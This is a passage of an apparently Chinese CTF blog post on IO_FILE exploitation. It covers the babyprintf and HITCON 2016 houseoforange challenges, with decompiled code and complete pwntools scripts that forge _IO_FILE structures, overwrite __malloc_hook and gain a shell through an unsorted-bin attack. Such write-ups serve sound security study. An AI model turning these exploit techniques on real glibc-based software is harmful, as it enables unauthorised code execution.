+  puts(&quot;heap is too dangrous for printf :(&quot;);
+  __printf_chk(1LL, (__int64)&quot;So I change the buffer location to %p\n&quot;, (__int64)buffer);
+  puts(&quot;Have fun!&quot;);
+  v3 = *(_QWORD *)&amp;stdout[1]._flags;
+  while ( 1 )
+  {
+    i = 0;
+    while ( 1 )
+    {
+      read(0, &amp;buf, 1uLL);
+      buffer[i] = buf;
+      if ( buffer[i] == &#39;\n&#39; )
+        break;
+      if ( ++i &gt; 0x1ff )
+        goto LABEL_6;
+    }
+    buffer[i] = 0;
+LABEL_6:
+    v4 = stdout;
+    if ( *(_QWORD *)&amp;stdout[1]._flags != v3 )
+    {
+      write(1, &quot;rewrite vtable is not permitted!\n&quot;, 0x21uLL);
+      *(_QWORD *)&amp;v4[1]._flags = v3;
+    }
+    __printf_chk(1LL, (__int64)buffer, 0xdeadbeefuLL);
+  }
+}
+</code></pre>
+<p>经过调试发现 buffer 就在 stdout 的前 0x10 的位置。虽然不能修改原来的 stdout，但是我们可以覆盖 stdout 的指针，创建一个新的 stdout 结构体。在调试的时候获取相关的一些结构体成员：</p>
+<pre><code>pwndbg&gt; p/x _IO_2_1_stdout_
+$1 = {
+  file = {
+    _flags = 0xfbad2887,
+    _IO_read_ptr = 0x7ffff7dd26a3,
+    _IO_read_end = 0x7ffff7dd26a3,
+    _IO_read_base = 0x7ffff7dd26a3,
+    _IO_write_base = 0x7ffff7dd26a3,
+    _IO_write_ptr = 0x7ffff7dd26a3,
+    _IO_write_end = 0x7ffff7dd26a3,
+    _IO_buf_base = 0x7ffff7dd26a3,
+    _IO_buf_end = 0x7ffff7dd26a4,
+    _IO_save_base = 0x0,
+    _IO_backup_base = 0x0,
+    _IO_save_end = 0x0,
+    _markers = 0x0,
+    _chain = 0x7ffff7dd18e0,
+    _fileno = 0x1,
+    _flags2 = 0x0,
+    _old_offset = 0xffffffffffffffff,
+    _cur_column = 0x0,
+    _vtable_offset = 0x0,
+    _shortbuf = {0xa},
+    _lock = 0x7ffff7dd3780,
+    _offset = 0xffffffffffffffff,
+    _codecvt = 0x0,
+    _wide_data = 0x7ffff7dd17a0,
+    _freeres_list = 0x0,
+    _freeres_buf = 0x0,
+    __pad5 = 0x0,
+    _mode = 0xffffffff,
+    _unused2 = {0x0 &lt;repeats 20 times&gt;}
+  },
+  vtable = 0x7ffff7dd06e0
+}
+</code></pre><p>伪造 stdout 中的成员泄漏 vtable 来获取 libc，然后把 malloc_hook 改成 one_gadget，最后想办法在最后的 printf_chk 处触发 malloc。利用 <a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#FILE-py-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E4%BC%AA%E9%80%A0%E6%A8%A1%E5%9D%97" target="_blank" rel="noopener">veritas501 写的 FILE 模块</a>来构造 <code>_IO_FILE</code> 结构体：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+from FILE import *
+
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]
+
+p = process(&#39;./babyprintf&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+
+p.recvuntil(&#39;So I change the buffer location to &#39;)
+buffer_addr = int(p.recvuntil(&#39;\n&#39;, drop=True)[2:], 16)
+binary_base = buffer_addr - 0x202010
+info(&#39;buffer_addr = &#39; + hex(buffer_addr))
+p.recvuntil(&#39;Have fun!\n&#39;)
+
+def leak(addr):
+    fake_file = IO_FILE_plus_struct()
+    fake_file._flags = 0x00000000fbad2887
+    fake_file._IO_read_end = addr
+    fake_file._IO_write_base = addr
+    fake_file._IO_write_ptr = addr + 8
+    fake_file._fileno = 1
+    fake_file._lock = buffer_addr + 0x100
+    payload = &#39;A&#39; * 0x10 + p64(buffer_addr + 0x20) + p64(0) + str(fake_file)[:-8]
+    p.sendline(payload)
+    p.recvline()
+    return u64(p.recv(8))
+
+def write(addr, data):
+    while data != 0:
+        fake_file = IO_FILE_plus_struct()
+        fake_file._flags = 0x00000000fbad2887
+        fake_file._IO_read_end = buffer_addr
+        fake_file._IO_buf_base = addr
+        fake_file._fileno = 1
+        fake_file._lock = buffer_addr + 0x100
+        payload = &#39;A&#39; * 0x10 + p64(buffer_addr + 0x20) + p64(0) + str(fake_file)[:-8]
+        p.sendline(payload)
+        p.sendline(chr(data &amp; 0xff))
+        addr += 1
+        data &gt;&gt;= 8
+
+vtable_addr = buffer_addr + 0xf8
+libc_base = leak(vtable_addr) - libc.symbols[&#39;_IO_file_jumps&#39;]
+info(&#39;libc_base = &#39; + hex(libc_base))
+malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]
+one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
+one_gadget = libc_base + one_gadgets[1]
+#gdb.attach(p)
+write(malloc_hook, one_gadget)
+
+p.sendline(&#39;%66666c&#39;)
+p.recvuntil(&#39;\x7f&#39;)
+p.interactive()
+</code></pre>
+<h1 id="2016-HITCON-houseoforange"><a href="#2016-HITCON-houseoforange" class="headerlink" title="2016-HITCON-houseoforange"></a>2016-HITCON-houseoforange</h1><p>通过 sysmalloc 构造 Free Chunk 的过程不过多叙述，主要是记录 IO_FILE 的利用。程序保护全开，流程大概如下。有建 House、升级 House、查看 House 三个功能：</p>
+<pre><code class="cpp">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+{
+  signed int c; // eax
+
+  sub_1218();
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      menu();
+      c = read_int();
+      if ( c != 2 )
+        break;
+      see();
+    }
+    if ( c &gt; 2 )
+    {
+      if ( c == 3 )
+      {
+        upgrade();
+      }
+      else
+      {
+        if ( c == 4 )
+        {
+          puts(&quot;give up&quot;);
+          exit(0);
+        }
+LABEL_14:
+        puts(&quot;Invalid choice&quot;);
+      }
+    }
+    else
+    {
+      if ( c != 1 )
+        goto LABEL_14;
+      build();
+    }
+  }
+}
+</code></pre>
+<p>涉及到的结构体有 House 还有 Orange：</p>
+<pre><code class="cpp">struct orange {
+  int price;
+  int color;
+};
+
+struct house {
+  struct orange *org;
+  char *name;
+};
+</code></pre>
+<p>各个函数中大概是只能 Build 三次，每次只能 Upgrade 两次。其中在 Upgrade 时是重新输入 Name 的长度来读取，且只要小于 0x1000 就行，所以有 Heap Overflow：</p>
+<pre><code class="cpp">int upgrade()
+{
+  struct orange *org; // rbx
+  unsigned int len; // [rsp+8h] [rbp-18h]
+  signed int color_id; // [rsp+Ch] [rbp-14h]
+
+  if ( times &gt; 2u )
+    return puts(&quot;You can&#39;t upgrade more&quot;);
+  if ( !houses )
+    return puts(&quot;No such house !&quot;);
+  printf(&quot;Length of name :&quot;);
+  len = read_int();
+  if ( len &gt; 0x1000 )
+    len = 0x1000;
+  printf(&quot;Name:&quot;);
+  read_buf(houses-&gt;name, len);
+  printf(&quot;Price of Orange: &quot;, len);
+  org = houses-&gt;org;
+  org-&gt;price = read_int();
+  color_menu();
+  printf(&quot;Color of Orange: &quot;);
+  color_id = read_int();
+  if ( color_id != 0xDDAA &amp;&amp; (color_id &lt;= 0 || color_id &gt; 7) )
+  {
+    puts(&quot;No such color&quot;);
+    exit(1);
+  }
+  if ( color_id == 0xDDAA )
+    houses-&gt;org-&gt;color = 0xDDAA;
+  else
+    houses-&gt;org-&gt;color = color_id + 30;
+  ++times;
+  return puts(&quot;Finish&quot;);
+}
+</code></pre>
+<p>其中读 Name 时，用 read 来读，不会给 buf 后面补 0，所以可以泄漏出后面的内容：</p>
+<pre><code class="cpp">ssize_t __fastcall read_buf(void *buf, unsigned int len)
+{
+  ssize_t result; // rax
+
+  result = read(0, buf, len);
+  if ( (signed int)result &gt; 0 )
+    return result;
+  puts(&quot;read error&quot;);
+  exit(1);
+  return result;
+}
+</code></pre>
+<p>然后这里利用 IO_FILE 的思路大概如下，利用 Unsortedbin Attack 的特性，下次 malloc 的时候，程序会调用 <code>malloc_printeer</code> 输出错误信息，最终一层层调用到 vtable 中的 <code>_IO_overflow_t</code>：</p>
+<pre><code> +--------------------+
+ | malloc_printerr    |
+ +--------------------+
+            |
+            v
+ +--------------------+
+ | __libc_message     |
+ +--------------------+
+            |
+            v
+ +--------------------+
+ | abort              |
+ +--------------------+
+            |
+            v
+ +--------------------+
+ | _IO_flush_all_lockp|
+ +--------------------+
+            |
+            v
+ +--------------------+
+ | _IO_overflow_t     |
+ +--------------------+
+</code></pre><p>在 <code>_IO_flush_all_lockp</code> 中，最终我们要执行 <code>_IO_OVERFLOW (fp, EOF)</code>，故要构造好 vtable 来改掉 <code>_IO_OVERFLOW</code>。前面的条件判断部分用 <code>||</code> 分为两部分，满足任一即可，（这里是 libc-2.23，根据前面 libc-2.24 及以后的版本的 IO_FILE 利用可以得出相应的 House-of-Orange 的做法）：</p>
+<pre><code class="cpp">int
+_IO_flush_all_lockp (int do_lock)
+{
+  int result = 0;
+  struct _IO_FILE *fp;
+  int last_stamp;
+
+#ifdef _IO_MTSAFE_IO
+  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
+  if (do_lock)
+    _IO_lock_lock (list_all_lock);
+#endif
+
+  last_stamp = _IO_list_all_stamp;
+  fp = (_IO_FILE *) _IO_list_all;
+  while (fp != NULL)
+    {
+      run_fp = fp;
+      if (do_lock)
+    _IO_flockfile (fp);
+
+      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
+#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
+       || (_IO_vtable_offset (fp) == 0
+           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
+                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))
+#endif
+       )
+      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
+    result = EOF;
+
+      if (do_lock)
+    _IO_funlockfile (fp);
+      run_fp = NULL;
+
+      if (last_stamp != _IO_list_all_stamp)
+    {
+      /* Something was added to the list.  Start all over again.  */
+      fp = (_IO_FILE *) _IO_list_all;
+      last_stamp = _IO_list_all_stamp;
+    }
+      else
+    fp = fp-&gt;_chain;
+    }
+
+#ifdef _IO_MTSAFE_IO
+  if (do_lock)
+    _IO_lock_unlock (list_all_lock);
+  __libc_cleanup_region_end (0);
+#endif
+
+  return result;
+}
+</code></pre>
+<ul>
+<li>条件 1 构造如下：<ul>
+<li><code>fp-&gt;_mode = 0</code>（<code>fp-&gt;_mode &lt;= 0</code>）</li>
+<li><code>fp-&gt;_IO_write_ptr = 1 ; fp-&gt;_IO_write_base = 0</code>（<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>）</li>
+</ul>
+</li>
+<li>条件 2 构造如下（具体查看 <code>_IO_wide_data</code> 结构体）：<ul>
+<li><code>fp-&gt;_mode = 1</code>（<code>fp-&gt;_mode &gt; 0</code>）</li>
+<li><code>fp-&gt;_wide_data-&gt;_IO_write_ptr = _IO_read_end ; fp-&gt;_wide_data-&gt;_IO_write_base = _IO_read_ptr</code>（<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>）</li>
+</ul>
+</li>
+</ul>
+<p>接下来利用 Unsortedbin-Attack 将 <code>_IO_list_all</code> 的值改到 Unsortedbin 的位置（把这里当成 <code>_IO_2_1_stderr</code>）。然后在 Unsortedbin 上构造好一个大小为 0x60 的 Smallbin Chunk，同时在这里伪造一个能够 Bypass 的 IO_FILE 结构体。这样 <code>_IO_list_all</code> 的 <code>_chain</code> 就会指到这个地址的偏移 0x68 处（即 0x60 的 Smallbin），又指向我们在堆上构造的 IO_FILE（这里借用 veritas501 的图）：</p>
+<pre><code class="txt"> +0x00 [       top        |  last_remainder   ]
+ +0x10 [ unsorted bin fd  |  unsorted bin bk  ]
+ +0x20 [ smallbin 0x20 fd | smallbin 0x20 bk  ]
+ +0x30 [ smallbin 0x30 fd | smallbin 0x30 bk  ]
+ +0x40 [ smallbin 0x40 fd | smallbin 0x40 bk  ]
+ +0x50 [ smallbin 0x50 fd | smallbin 0x50 bk  ]
+ +0x60 [ smallbin 0x60 fd | smallbin 0x60 bk  ] /* 0x68 */
+</code></pre>
+<p>说实话最后一步一层一层调试还是很复杂的，而且如果调不到 one_gadget 都判断不了 ESP 的值对不对。最后总算是调出来了：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+from FILE import *
+
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]
+
+def cmd(c):
+    p.recvuntil(&#39;Your choice :&#39;)
+    p.sendline(str(c))
+
+def build(length, name, price, color):
+    cmd(1)
+    p.recvuntil(&#39;Length of name :&#39;)
+    p.sendline(str(length))
+    p.recvuntil(&#39;Name :&#39;)
+    p.send(name)
+    p.recvuntil(&#39;Price of Orange:&#39;)
+    p.sendline(str(price))
+    p.recvuntil(&#39;Color of Orange:&#39;)
+    p.sendline(str(color))
+
+def see():
+    cmd(2)
+
+def upgrade(length, name, price, color):
+    cmd(3)
+    p.recvuntil(&#39;Length of name :&#39;)
+    p.sendline(str(length))
+    p.recvuntil(&#39;Name:&#39;)
+    p.send(name)
+    p.recvuntil(&#39;Price of Orange:&#39;)
+    p.sendline(str(price))
+    p.recvuntil(&#39;Color of Orange:&#39;)
+    p.sendline(str(color))
+
+def giveup():
+    cmd(4)
+
+p = process(&#39;./houseoforange&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+
+build(0x28, &#39;1&#39; * 8, 1, 1)
+upgrade(0x60, &#39;2&#39; * 0x40 + p64(0) + p64(0xf91), 1, 1) # Overflow top chunk
+build(0x1000, &#39;3&#39; * 0x8, 1, 1) # Trigger sysmalloc
+build(0x500, &#39;4&#39; * 0x8, 1, 1) # Get a chunk from Unsorted-bin &amp;&amp; Put the remain chunk into Smallbin
+see() # Leak Unsorted-bin ptr
+p.recvuntil(&#39;4&#39; * 0x8)
+offset = 0x7fc27d99a188 - 0x7fc27d5d5000
+libc_base = u64(p.recvuntil(&#39;\n&#39;, drop=True).ljust(8, &#39;\x00&#39;)) - offset
+info(&#39;libc_base = &#39; + hex(libc_base))
+one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
+one_gadget = libc_base + one_gadgets[3]
+
+upgrade(0x500, &#39;5&#39; * 0x10, 1, 1)
+see()
+p.recvuntil(&#39;5&#39; * 0x10)
+heap_base = u64(p.recvuntil(&#39;\n&#39;, drop=True).ljust(8, &#39;\x00&#39;)) - 0xd0
+info(&#39;heap_base = &#39; + hex(heap_base))
+
+io_list_all = libc_base + libc.symbols[&#39;_IO_list_all&#39;]
+fake_file = IO_FILE_plus_struct()
+fake_file._IO_read_ptr = 0x61 # Small-bin size
+fake_file._IO_read_base = io_list_all - 0x10 # Small-bin&#39;s bk ; Unsorted-bin Attack
+fake_file._mode = 0
+fake_file._IO_write_ptr = 1
+fake_file._IO_write_base = 0
+fake_file.vtable = heap_base + 0x6e0
+payload = &#39;6&#39; * 0x500 + p64(0) + p64(0x21) + p32(1) + p32(0x1f) + p64(0)
+payload += str(fake_file) # heap_base + 0x600
+payload += &#39;\x00&#39; * 0x18 + p64(one_gadget)
+#gdb.attach(p, &#39;dir ~/glibc-2.23/malloc\nb _int_malloc&#39; + &#39;\nc&#39; * 6)
+#gdb.attach(p, &#39;dir ~/glibc-2.23/libio\nb __libc_message\nb abort\nc&#39;)
+upgrade(0x800, payload, 1, 1)
+cmd(1)
+p.interactive()
+</code></pre>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/</a><br><a href="https://ctftime.org/writeup/12124" target="_blank" rel="noopener">https://ctftime.org/writeup/12124</a><br><a href="https://dangokyo.me/2017/12/13/hitcon-2016-ctf-quals-house-of-orange-write-up/" target="_blank" rel="noopener">https://dangokyo.me/2017/12/13/hitcon-2016-ctf-quals-house-of-orange-write-up/</a><br><a href="https://github.com/scwuaptx/CTF/blob/master/2016-writeup/hitcon/houseoforange.py" target="_blank" rel="noopener">https://github.com/scwuaptx/CTF/blob/master/2016-writeup/hitcon/houseoforange.py</a><br><a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="noopener">http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</a><br><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/04/23/Linux-Sandbox-Setuid/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Linux Sandbox - Setuid</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/04/18/Linux-Sandbox-Ptrace/">
+                        <span>Linux Sandbox - Ptrace</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "IO_FILE in CTF&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+          tex2jax: {
+              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+              processEscapes: true,
+              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+          }
+      });
+
+      MathJax.Hub.Queue(function() {
+          var all = MathJax.Hub.getAllJax(), i;
+          for(i=0; i < all.length; i += 1) {
+              all[i].SourceElement().parentNode.className += ' has-jax';
+          }
+      });
+
+    </script>
+
+    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+  
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
